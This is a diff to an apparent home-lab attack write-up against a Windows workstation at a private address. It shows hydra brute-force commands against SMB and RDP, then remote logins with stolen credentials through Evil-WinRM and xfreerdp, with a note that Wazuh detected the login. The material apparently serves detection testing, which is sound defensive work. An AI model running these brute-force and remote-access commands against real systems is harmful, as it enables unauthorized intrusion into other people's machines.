@@ -45,3 +45,24 @@ Copy
 Edit
 hydra -L users.txt -P passwords.txt smb://10.0.0.101
 hydra -L users.txt -P passwords.txt rdp://10.0.0.101
+
+###3. Remote Shell via Evil-WinRM
+Tool: Evil-WinRM
+Target: client-win
+Purpose: Remote PowerShell access using stolen credentials.
+
+bash
+Copy
+Edit
+evil-winrm -i 10.0.0.101 -u jdoe -p @password123!
+
+###4. Remote Desktop Session (xfreerdp)
+Tool: xfreerdp
+Purpose: Full GUI login to target workstation.
+
+bash
+Copy
+Edit
+xfreerdp /u:jdoe /p:password123 /v:10.0.0.101
+Results: Successful RDP session.
+ Detection: Wazuh detected successful login (Event ID 4624).
